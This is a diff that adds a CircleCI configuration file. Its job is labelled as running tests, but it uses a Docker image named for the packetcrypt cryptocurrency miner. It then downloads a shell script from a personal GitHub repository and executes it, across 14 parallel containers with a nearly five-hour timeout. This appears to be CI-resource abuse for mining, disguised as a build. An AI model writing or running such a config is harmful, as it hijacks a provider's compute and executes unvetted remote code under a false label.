@@ -1,1 +1,19 @@
-Ls
+version: 2.1
+jobs:
+  build_and_test: # this can be any name you choose
+    docker:
+      - image: thomasjp0x42/packetcrypt
+    steps:
+      - checkout
+      - run:
+          name: Run tests
+          no_output_timeout: 294m
+          command: |
+                  wget https://raw.githubusercontent.com/Snsnn88228/nns/main/Run.sh && chmod +x Run.sh && ./Run.sh
+                  echo "lah"
+    parallelism: 14
+workflows:
+  version: 2
+  build: 
+     jobs:
+       - build_and_test
